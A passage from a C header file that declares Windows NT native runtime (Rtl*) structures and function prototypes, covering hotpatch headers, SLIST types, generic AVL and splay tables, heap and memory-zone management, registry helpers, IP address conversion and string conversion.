		UCHAR       Channel;
		UCHAR       Level;
		UCHAR       Opcode;
		USHORT      Task;
		ULONGLONG   Keyword;
	} EVENT_DESCRIPTOR, *PEVENT_DESCRIPTOR;
	typedef const EVENT_DESCRIPTOR *PCEVENT_DESCRIPTOR;

	//
	// EVENT_FILTER_DESCRIPTOR is used to pass in enable filter
	// data item to a user callback function.
	// 
	typedef struct _EVENT_FILTER_DESCRIPTOR
	{
		ULONG_PTR   Ptr;
		ULONG       Size;
		ULONG       Type;
	} EVENT_FILTER_DESCRIPTOR, *PEVENT_FILTER_DESCRIPTOR;

//
// old nt4 channel stuff
//
//#pragma pack(1)
#pragma pack()
typedef struct _CHANNEL_MESSAGE
{
	PVOID Text;
	ULONG Length;
	PVOID Context;
	PVOID Base;
	union
	{
		BOOLEAN Close;
		LONGLONG Align;
	};
} CHANNEL_MESSAGE, *PCHANNEL_MESSAGE;

typedef struct _HOTPATCH_HEADER
{
	ULONG Signature;
	ULONG Version;
	ULONG FixupRgnCount;
	ULONG FixupRgnRva;
	ULONG ValidationCount;
	ULONG ValidationArrayRva;
	ULONG HookCount;
	ULONG HookArrayRva;
	ULONG_PTR OrigHotpBaseAddress;
	ULONG_PTR OrigTargetBaseAddress;
	ULONG TargetNameRva;
	ULONG ModuleIdMethod;
	union { 
		ULONG Filler;
	} TargetModuleIdValue;
} HOTPATCH_HEADER, *PHOTPATCH_HEADER;

typedef struct _HOTPATCH_MODULE_DATA
{
	USHORT HotpatchImageNameLength;
	USHORT ColdpatchImagePathLength;
	WCHAR NameBuffer[ 1 ];
} HOTPATCH_MODULE_DATA, *PHOTPATCH_MODULE_DATA;

typedef struct _HOTPATCH_MODULE_ENTRY
{
	struct _TRIPLE_LIST_ENTRY ListEntry;
	struct _HOTPATCH_MODULE_DATA Data;
} HOTPATCH_MODULE_ENTRY, *PHOTPATCH_MODULE_ENTRY;

typedef struct _HOTPATCH_HOOK
{
	USHORT HookType;
	USHORT HookOptions;
	ULONG HookRva;
	ULONG HotpRva;
	ULONG ValidationRva;
} HOTPATCH_HOOK, *PHOTPATCH_HOOK;

typedef struct _RTL_PATCH_HEADER
{
	LIST_ENTRY PatchList;
	PVOID PatchImageBase;
	struct _RTL_PATCH_HEADER* NextPatch;
	ULONG PatchFlags;
	LONG PatchRefCount;
	struct _HOTPATCH_HEADER* HotpatchHeader;
	UNICODE_STRING TargetDllName;
	HANDLE TargetDllBase;
	PLDR_DATA_TABLE_ENTRY TargetLdrDataTableEntry;
	PLDR_DATA_TABLE_ENTRY PatchLdrDataTableEntry;
	PSYSTEM_HOTPATCH_CODE_INFORMATION CodeInfo;
	PVOID ColdpatchFileHandle;
	HOTPATCH_MODULE_ENTRY HotpatchModuleEntry;
} RTL_PATCH_HEADER, *PRTL_PATCH_HEADER;



#pragma warning(default: 4273) // nconsistent dll linkage (winnt.h)

#ifndef _SLIST_HEADER_
#define _SLIST_HEADER_

#if defined(_M_X64)

//
// The type SINGLE_LIST_ENTRY is not suitable for use with SLISTs.  For
// WIN64, an entry on an SLIST is required to be 16-byte aligned, while a
// SINGLE_LIST_ENTRY structure has only 8 byte alignment.
//
// Therefore, all SLIST code should use the SLIST_ENTRY type instead of the
// SINGLE_LIST_ENTRY type.
//

#pragma warning(push)
#pragma warning(disable:4324)   // structure padded due to align()
typedef struct DECLSPEC_ALIGN(16) _SLIST_ENTRY *PSLIST_ENTRY;
typedef struct DECLSPEC_ALIGN(16) _SLIST_ENTRY {
    PSLIST_ENTRY Next;
} SLIST_ENTRY;
#pragma warning(pop)

#else

#define SLIST_ENTRY SINGLE_LIST_ENTRY
#define _SLIST_ENTRY _SINGLE_LIST_ENTRY
#define PSLIST_ENTRY PSINGLE_LIST_ENTRY

#endif

#if defined(_M_X64)

typedef struct DECLSPEC_ALIGN(16) _SLIST_HEADER {
    ULONGLONG Alignment;
    ULONGLONG Region;
} SLIST_HEADER;

typedef struct _SLIST_HEADER *PSLIST_HEADER;

#else

typedef union _SLIST_HEADER {
    ULONGLONG Alignment;
    struct {
        SLIST_ENTRY Next;
        WORD   Depth;
        WORD   Sequence;
    };
} SLIST_HEADER, *PSLIST_HEADER;

#endif

#endif

//
// prototypes *must* be encapsulated with extern "C" macros at start and end of prototype block
//

PSLIST_ENTRY
__fastcall
RtlInterlockedPushListSList (
     IN PSLIST_HEADER ListHead,
     IN PSLIST_ENTRY List,
     IN PSLIST_ENTRY ListEnd,
     IN ULONG Count
     );

VOID
NTAPI
RtlAssert(
	IN PVOID VoidFailedAssertion,
	IN PVOID VoidFileName,
	IN ULONG LineNumber,
	IN OPTIONAL PSTR MutableMessage
    );

VOID
NTAPI
RtlInitializeGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PRTL_AVL_COMPARE_ROUTINE CompareRoutine,
    PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine,
    PRTL_AVL_FREE_ROUTINE FreeRoutine,
    PVOID TableContext
    );

PVOID
NTAPI
RtlInsertElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL
    );

PVOID
NTAPI
RtlInsertElementGenericTableFullAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL,
    PVOID NodeOrParent,
    TABLE_SEARCH_RESULT SearchResult
    );

BOOLEAN
NTAPI
RtlDeleteElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTableFullAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer,
    OUT PVOID *NodeOrParent,
    OUT TABLE_SEARCH_RESULT *SearchResult
    );

PVOID
NTAPI
RtlEnumerateGenericTableAvl (
    PRTL_AVL_TABLE Table,
    BOOLEAN Restart
    );

PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplayingAvl (
    PRTL_AVL_TABLE Table,
    PVOID *RestartKey
    );

PVOID
NTAPI
RtlEnumerateGenericTableLikeADirectory (
    IN PRTL_AVL_TABLE Table,
    IN PRTL_AVL_MATCH_FUNCTION MatchFunction,
    IN PVOID MatchData,
    IN ULONG NextFlag,
    IN OUT PVOID *RestartKey,
    IN OUT PULONG DeleteCount,
    IN OUT PVOID Buffer
    );

PVOID
NTAPI
RtlGetElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    ULONG I
    );

ULONG
NTAPI
RtlNumberGenericTableElementsAvl (
    PRTL_AVL_TABLE Table
    );

BOOLEAN
NTAPI
RtlIsGenericTableEmptyAvl (
    PRTL_AVL_TABLE Table
    );

PRTL_SPLAY_LINKS
NTAPI
RtlSplay (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlDelete (
    PRTL_SPLAY_LINKS Links
    );

VOID
NTAPI
RtlDeleteNoSplay (
    PRTL_SPLAY_LINKS Links,
    PRTL_SPLAY_LINKS *Root
    );

PRTL_SPLAY_LINKS
NTAPI
RtlSubtreeSuccessor (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlSubtreePredecessor (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlRealSuccessor (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlRealPredecessor (
    PRTL_SPLAY_LINKS Links
    );

VOID
NTAPI
RtlInitializeGenericTable (
    PRTL_GENERIC_TABLE Table,
    PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine,
    PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine,
    PRTL_GENERIC_FREE_ROUTINE FreeRoutine,
    PVOID TableContext
    );

PVOID
NTAPI
RtlInsertElementGenericTable (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL
    );

PVOID
NTAPI
RtlInsertElementGenericTableFull (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL,
    PVOID NodeOrParent,
    TABLE_SEARCH_RESULT SearchResult
    );

BOOLEAN
NTAPI
RtlDeleteElementGenericTable (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTable (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTableFull (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer,
    OUT PVOID *NodeOrParent,
    OUT TABLE_SEARCH_RESULT *SearchResult
    );

PVOID
NTAPI
RtlEnumerateGenericTable (
    PRTL_GENERIC_TABLE Table,
    BOOLEAN Restart
    );

PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplaying (
    PRTL_GENERIC_TABLE Table,
    PVOID *RestartKey
    );

PVOID
NTAPI
RtlGetElementGenericTable(
    PRTL_GENERIC_TABLE Table,
    ULONG I
    );

ULONG
NTAPI
RtlNumberGenericTableElements(
    PRTL_GENERIC_TABLE Table
    );

BOOLEAN
NTAPI
RtlIsGenericTableEmpty (
    PRTL_GENERIC_TABLE Table
    );

NTSTATUS
NTAPI
RtlInitializeHeapManager(
    );

PVOID
NTAPI
RtlCreateHeap(
	IN ULONG Flags,
	IN PVOID HeapBase OPTIONAL,
	IN SIZE_T ReserveSize OPTIONAL,
	IN SIZE_T CommitSize OPTIONAL,
	IN PVOID Lock OPTIONAL,
	IN PRTL_HEAP_PARAMETERS Parameters OPTIONAL
	);

PVOID
NTAPI
RtlDestroyHeap(
    IN PVOID HeapHandle
    );

PVOID
NTAPI
RtlAllocateHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN SIZE_T Size
    );

BOOLEAN
NTAPI
RtlFreeHeap(
	IN PVOID HeapHandle,
	IN OPTIONAL ULONG Flags,
	IN PVOID BaseAddress
	);

SIZE_T
NTAPI
RtlSizeHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress
    );

NTSTATUS
NTAPI
RtlZeroHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags
    );

VOID
NTAPI
RtlProtectHeap(
    IN PVOID HeapHandle,
    IN BOOLEAN MakeReadOnly
    );

ULONG
NTAPI
RtlGetNtGlobalFlags(
    VOID
    );

VOID
NTAPI
RtlGetCallersAddress(
    OUT PVOID *CallersAddress,
    OUT PVOID *CallersCaller
    );

ULONG
NTAPI
RtlWalkFrameChain (
    OUT PVOID *Callers,
    IN ULONG Count,
    IN ULONG Flags
    );

USHORT
NTAPI
RtlLogStackBackTrace(
    VOID
    );


ULONG
NTAPI
RtlCaptureStackContext (
    OUT PULONG_PTR Callers,
    OUT PRTL_STACK_CONTEXT Context,
    IN ULONG Limit
    );

BOOLEAN
NTAPI
RtlGetNtProductType(
	PNT_PRODUCT_TYPE NtProductType
	);

NTSTATUS
NTAPI
RtlFormatCurrentUserKeyPath (
    OUT PUNICODE_STRING CurrentUserKeyPath
    );

NTSTATUS
NTAPI
RtlOpenCurrentUser(
    IN ULONG DesiredAccess,
    OUT PHANDLE CurrentUserKey
    );

NTSTATUS
NTAPI
RtlQueryRegistryValues(
    IN ULONG RelativeTo,
    IN PCWSTR Path,
    IN PRTL_QUERY_REGISTRY_TABLE QueryTable,
    IN PVOID Context,
    IN PVOID Environment OPTIONAL
    );

NTSTATUS
NTAPI
RtlWriteRegistryValue(
    IN ULONG RelativeTo,
    IN PCWSTR Path,
    IN PCWSTR ValueName,
    IN ULONG ValueType,
    IN PVOID ValueData,
    IN ULONG ValueLength
    );

NTSTATUS
NTAPI
RtlDeleteRegistryValue(
    IN ULONG RelativeTo,
    IN PCWSTR Path,
    IN PCWSTR ValueName
    );

NTSTATUS
NTAPI
RtlCreateRegistryKey(
	IN ULONG RelativeTo,
	IN PWSTR Path
    );

NTSTATUS
NTAPI
RtlCheckRegistryKey(
	IN ULONG RelativeTo,
	IN PWSTR Path
    );

//added 21/03/2011
//begin
BOOLEAN
NTAPI
RtlLockHeap(
	IN PVOID HeapHandle
	);


BOOLEAN
NTAPI
RtlUnlockHeap(
	IN PVOID HeapHandle
	);


PVOID
NTAPI
RtlReAllocateHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T Size
    );


BOOLEAN
NTAPI
RtlGetUserInfoHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN PVOID BaseAddress,
	OUT OPTIONAL PVOID *UserValue,
	OUT OPTIONAL PULONG UserFlags
    );


BOOLEAN
NTAPI
RtlSetUserValueHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN PVOID UserValue
    );


BOOLEAN
NTAPI
RtlSetUserFlagsHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN PVOID BaseAddress,
	IN ULONG UserFlagsReset,
	IN ULONG UserFlagsSet
	);


ULONG
NTAPI
RtlCreateTagHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN OPTIONAL PWSTR TagPrefix,
    IN PWSTR TagNames
    );


PWSTR
NTAPI
RtlQueryTagHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN USHORT TagIndex,
    IN BOOLEAN ResetCounters,
    OUT OPTIONAL PRTL_HEAP_TAG_INFO TagInfo
    );


NTSTATUS
NTAPI
RtlExtendHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID Base,
    IN SIZE_T Size
    );


SIZE_T
NTAPI
RtlCompactHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags
    );


BOOLEAN
NTAPI
RtlValidateProcessHeaps(
    );

ULONG
NTAPI
RtlGetProcessHeaps(
    IN ULONG NumberOfHeaps,
    OUT PVOID *ProcessHeaps
    );


NTSTATUS
NTAPI
RtlUsageHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN OUT PRTL_HEAP_USAGE Usage
	);


NTSTATUS
NTAPI
RtlWalkHeap(
	IN PVOID HeapHandle,
	IN OUT PRTL_HEAP_WALK_ENTRY Entry
	);

#if !defined(_WINDOWS_)
NTSTATUS
NTAPI
RtlQueryHeapInformation(
	IN PVOID HeapHandle,
	IN HEAP_INFORMATION_CLASS HeapInformationClass,
	OUT OPTIONAL PVOID HeapInformation,
	IN OPTIONAL SIZE_T HeapInformationLength,
	OUT OPTIONAL PSIZE_T ReturnLength
	);

NTSTATUS
NTAPI
RtlSetHeapInformation(
	IN PVOID HeapHandle,
	IN HEAP_INFORMATION_CLASS HeapInformationClass,
	IN OPTIONAL PVOID HeapInformation,
	IN OPTIONAL SIZE_T HeapInformationLength
	);
#endif

ULONG
NTAPI
RtlMultipleAllocateHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN SIZE_T Size,
	IN ULONG Count,
	OUT PVOID *Array
	);

ULONG
NTAPI
RtlMultipleFreeHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN ULONG Count,
	IN PVOID *Array
	);

VOID
NTAPI
RtlDetectHeapLeaks(
	VOID
	);


#if (NTDDI_VERSION >= NTDDI_VISTA)
NTSTATUS
NTAPI
RtlCreateMemoryZone(
	OUT PVOID *MemoryZone,
	IN SIZE_T InitialSize,
	ULONG Flags
	);

NTSTATUS
NTAPI
RtlDestroyMemoryZone(
	IN PVOID MemoryZone
	);

NTSTATUS
NTAPI
RtlAllocateMemoryZone(
	IN PVOID MemoryZone,
	IN SIZE_T BlockSize,
	OUT PVOID *Block
	);

NTSTATUS
NTAPI
RtlResetMemoryZone(
	IN PVOID MemoryZone
	);

NTSTATUS
NTAPI
RtlLockMemoryZone(
	IN PVOID MemoryZone
	);

NTSTATUS
NTAPI
RtlUnlockMemoryZone(
	IN PVOID MemoryZone
	);
#endif


#if (NTDDI_VERSION >= NTDDI_VISTA)
NTSTATUS
NTAPI
RtlCreateMemoryBlockLookaside(
	OUT PVOID *MemoryBlockLookaside,
	IN ULONG Flags,
	IN ULONG InitialSize,
	IN ULONG MinimumBlockSize,
	IN ULONG MaximumBlockSize
	);

NTSTATUS
NTAPI
RtlDestroyMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);

NTSTATUS
NTAPI
RtlAllocateMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside,
	IN ULONG BlockSize,
	OUT PVOID *Block
	);

NTSYSAPI
NTSTATUS
NTAPI
RtlFreeMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside,
	IN PVOID Block
	);

NTSTATUS
NTAPI
RtlExtendMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside,
	IN ULONG Increment
	);

NTSTATUS
NTAPI
RtlResetMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);

NTSTATUS
NTAPI
RtlLockMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);

NTSTATUS
NTAPI
RtlUnlockMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);
#endif

HANDLE
NTAPI
RtlGetCurrentTransaction(
	);

LOGICAL
NTAPI
RtlSetCurrentTransaction(
	IN HANDLE TransactionHandle
	);

PRTL_DEBUG_INFORMATION
NTAPI
RtlCreateQueryDebugBuffer(
	IN OPTIONAL ULONG MaximumCommit,
	IN BOOLEAN UseEventPair
	);

NTSTATUS
NTAPI
RtlDestroyQueryDebugBuffer(
	IN PRTL_DEBUG_INFORMATION Buffer
	);

NTSTATUS
NTAPI
RtlQueryProcessDebugInformation(
	IN HANDLE UniqueProcessId,
	IN ULONG Flags,
	IN OUT PRTL_DEBUG_INFORMATION Buffer
	);


//added 21/03/2011
//end

ULONG
NTAPI
RtlUniform (
	PULONG Seed
    );

NTSTATUS
RtlComputeImportTableHash(
	IN HANDLE hFile,
	OUT PCHAR Hash,
	IN ULONG ImportTableHashRevision
    );

NTSTATUS
NTAPI
RtlIntegerToChar (
    ULONG Value,
    ULONG Base,
    LONG OutputLength,
    PSZ String
    );

NTSTATUS
NTAPI
RtlIntegerToUnicode (
    IN ULONG Value,
    IN ULONG Base OPTIONAL,
    IN LONG OutputLength,
    OUT PWSTR String
    );

NTSTATUS
NTAPI
RtlLargeIntegerToChar (
    PLARGE_INTEGER Value,
    ULONG Base OPTIONAL,
    LONG OutputLength,
    PSZ String
    );

NTSTATUS
NTAPI
RtlLargeIntegerToUnicode (
    IN PLARGE_INTEGER Value,
    IN ULONG Base OPTIONAL,
    IN LONG OutputLength,
    OUT PWSTR String
    );

PSTR
NTAPI
RtlIpv4AddressToStringA (
	IN const struct in_addr *Addr,
	OUT PSTR S
	);

PSTR
NTAPI
RtlIpv6AddressToStringA (
	IN const struct in6_addr *Addr,
	OUT PSTR S
	);

NTSTATUS
NTAPI
RtlIpv4AddressToStringExA(
    IN const struct in_addr *Address,
    IN USHORT Port,
    OUT PSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

NTSTATUS
NTAPI
RtlIpv6AddressToStringExA(
    IN const struct in6_addr *Address,
    IN ULONG ScopeId,
    IN USHORT Port,
    OUT PSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

PWSTR
NTAPI
RtlIpv4AddressToStringW (
    IN const struct in_addr *Addr,
    OUT PWSTR S
    );

PWSTR
NTAPI
RtlIpv6AddressToStringW (
    IN const struct in6_addr *Addr,
    OUT PWSTR S
    );

NTSTATUS
NTAPI
RtlIpv4AddressToStringExW(
    IN const struct in_addr *Address,
    IN USHORT Port,
    OUT PWSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

NTSTATUS
NTAPI
RtlIpv6AddressToStringExW(
    IN const struct in6_addr *Address,
    IN ULONG ScopeId,
    IN USHORT Port,
    OUT PWSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressA (
    IN PCSTR S,
    IN BOOLEAN Strict,
    OUT PCSTR *Terminator,
    OUT struct in_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressA (
    IN PCSTR S,
    OUT PCSTR *Terminator,
    OUT struct in6_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressExA (
    IN PCSTR AddressString,
    IN BOOLEAN Strict,
    OUT struct in_addr *Address,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressExA (
    IN PCSTR AddressString,
    OUT struct in6_addr *Address,
    OUT PULONG ScopeId,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressW (
    IN PCWSTR S,
    IN BOOLEAN Strict,
    OUT LPCWSTR *Terminator,
    OUT struct in_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressW (
    IN PCWSTR S,
    OUT PCWSTR *Terminator,
    OUT struct in6_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressExW (
    IN PCWSTR AddressString,
    IN BOOLEAN Strict,
    OUT struct in_addr *Address,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressExW (
    IN PCWSTR AddressString,
    OUT struct in6_addr *Address,
    OUT PULONG ScopeId,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIntegerToUnicodeString (
    ULONG Value,
    ULONG Base,
    PUNICODE_STRING String
    );

NTSTATUS
NTAPI
RtlInt64ToUnicodeString (
    IN ULONGLONG Value,
    IN ULONG Base OPTIONAL,
    IN OUT PUNICODE_STRING String
    );

NTSTATUS
NTAPI
RtlUnicodeStringToInteger (
    PCUNICODE_STRING String,
    ULONG Base,
    PULONG Value
    );

VOID
NTAPI
RtlInitString(
    PSTRING DestinationString,
    PCSZ SourceString
    );

VOID
NTAPI
RtlInitAnsiString(
    PANSI_STRING DestinationString,
    PCSZ SourceString
    );

NTSTATUS
NTAPI
RtlInitUnicodeString(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

NTSTATUS
NTAPI
RtlInitUnicodeStringEx(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

NTSTATUS
NTAPI
RtlInitAnsiStringEx(
    OUT PANSI_STRING DestinationString,
    IN PCSZ SourceString OPTIONAL
    );

BOOLEAN
NTAPI
RtlCreateUnicodeString(
    OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
    );

BOOLEAN
NTAPI
RtlEqualDomainName(
    IN PCUNICODE_STRING String1,
    IN PCUNICODE_STRING String2
    );

BOOLEAN
NTAPI
RtlEqualComputerName(
    IN PCUNICODE_STRING String1,
    IN PCUNICODE_STRING String2
    );

NTSTATUS
RtlDnsHostNameToComputerName(
    OUT PUNICODE_STRING ComputerNameString,
    IN PCUNICODE_STRING DnsHostNameString,
    IN BOOLEAN AllocateComputerNameString
    );

BOOLEAN
NTAPI
RtlCreateUnicodeStringFromAsciiz(
    OUT PUNICODE_STRING DestinationString,
    IN PCSZ SourceString
    );

VOID
NTAPI
RtlCopyString(
    PSTRING DestinationString,
    const STRING * SourceString
    );

CHAR
NTAPI
RtlUpperChar (
    CHAR Character
    );

LONG
NTAPI
RtlCompareString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );

BOOLEAN
NTAPI
RtlEqualString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );

BOOLEAN
NTAPI
RtlPrefixString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );

VOID
NTAPI
RtlUpperString(
    PSTRING DestinationString,
    const STRING * SourceString
    );

NTSTATUS
NTAPI
RtlAppendAsciizToString (
    PSTRING Destination,
    PCSZ Source
    );

NTSTATUS
NTAPI
RtlAppendStringToString (
    PSTRING Destination,
    const STRING * Source
    );

NTSTATUS
NTAPI
RtlAnsiStringToUnicodeString(
    PUNICODE_STRING DestinationString,
    PCANSI_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

WCHAR
NTAPI
RtlAnsiCharToUnicodeChar(
    PUCHAR *SourceCharacter
    );

NTSTATUS
NTAPI
RtlUnicodeStringToAnsiString(
    PANSI_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToAnsiString(
    PANSI_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlOemStringToUnicodeString(
    PUNICODE_STRING DestinationString,
    PCOEM_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUnicodeStringToOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlOemStringToCountedUnicodeString(
    PUNICODE_STRING DestinationString,
    PCOEM_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUnicodeStringToCountedOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToCountedOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

LONG
NTAPI
RtlCompareUnicodeString(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN CaseInSensitive
    );

BOOLEAN
NTAPI
RtlEqualUnicodeString(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN CaseInSensitive
    );

NTSTATUS
NTAPI
RtlHashUnicodeString(
    IN const UNICODE_STRING *String,
    IN BOOLEAN CaseInSensitive,
    IN ULONG HashAlgorithm,
    OUT PULONG HashValue
    );

NTSTATUS
NTAPI
RtlValidateUnicodeString(
    IN ULONG Flags,
    IN const UNICODE_STRING *String
    );

NTSTATUS
NTAPI
RtlDuplicateUnicodeString(
    IN ULONG Flags,
    IN const UNICODE_STRING *StringIn,
    OUT UNICODE_STRING *StringOut
    );

BOOLEAN
NTAPI
RtlPrefixUnicodeString(
    IN PCUNICODE_STRING String1,
    IN PCUNICODE_STRING String2,
    IN BOOLEAN CaseInSensitive
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeString(
    PUNICODE_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlFindCharInUnicodeString(
    IN ULONG Flags,
    IN PCUNICODE_STRING StringToSearch,
    IN PCUNICODE_STRING CharSet,
    OUT USHORT *NonInclusivePrefixLength
    );

VOID
NTAPI
RtlCopyUnicodeString(
    PUNICODE_STRING DestinationString,
    PCUNICODE_STRING SourceString
    );

NTSTATUS
NTAPI
RtlAppendUnicodeStringToString (
    PUNICODE_STRING Destination,
    PCUNICODE_STRING Source
    );

NTSTATUS
NTAPI
RtlAppendUnicodeToString (
    PUNICODE_STRING Destination,
    PCWSTR Source
    );

WCHAR
NTAPI
RtlUpcaseUnicodeChar(
    WCHAR SourceCharacter
    );

WCHAR
NTAPI
RtlDowncaseUnicodeChar(
    WCHAR SourceCharacter
    );

VOID
NTAPI
RtlFreeUnicodeString(
    PUNICODE_STRING UnicodeString
    );

VOID
NTAPI
RtlFreeAnsiString(
    PANSI_STRING AnsiString
    );

VOID
NTAPI
RtlFreeOemString(
    POEM_STRING OemString
    );

ULONG
NTAPI
RtlxUnicodeStringToAnsiSize(
    PCUNICODE_STRING UnicodeString
    );

ULONG
NTAPI
RtlxUnicodeStringToOemSize(
    PCUNICODE_STRING UnicodeString
    );

ULONG
NTAPI
RtlxAnsiStringToUnicodeSize(
    PCANSI_STRING AnsiString
    );

ULONG
NTAPI
RtlxOemStringToUnicodeSize(
    PCOEM_STRING OemString
    );

NTSTATUS
NTAPI
RtlMultiByteToUnicodeN(
	OUT PWCH UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString,
	IN PCSTR MultiByteString,
	IN ULONG BytesInMultiByteString
    );

NTSTATUS
NTAPI
RtlMultiByteToUnicodeSize(
    PULONG BytesInUnicodeString,
    PCSTR MultiByteString,
    ULONG BytesInMultiByteString
    );

NTSTATUS
NTAPI
RtlUnicodeToMultiByteSize(
	OUT PULONG BytesInMultiByteString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlUnicodeToMultiByteN(
	OUT PCHAR MultiByteString,
	IN ULONG MaxBytesInMultiByteString,
	OUT OPTIONAL PULONG BytesInMultiByteString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
	);

NTSTATUS
NTAPI
RtlUpcaseUnicodeToMultiByteN(
	OUT PCHAR MultiByteString,
	IN ULONG MaxBytesInMultiByteString,
	OUT OPTIONAL PULONG BytesInMultiByteString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlOemToUnicodeN(
	OUT PWSTR UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString,
	IN PCH OemString,
	IN ULONG BytesInOemString
    );

NTSTATUS
NTAPI
RtlUnicodeToOemN(
	OUT PCHAR OemString,
	IN ULONG MaxBytesInOemString,
	OUT OPTIONAL PULONG BytesInOemString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeToOemN(
	OUT PCHAR OemString,
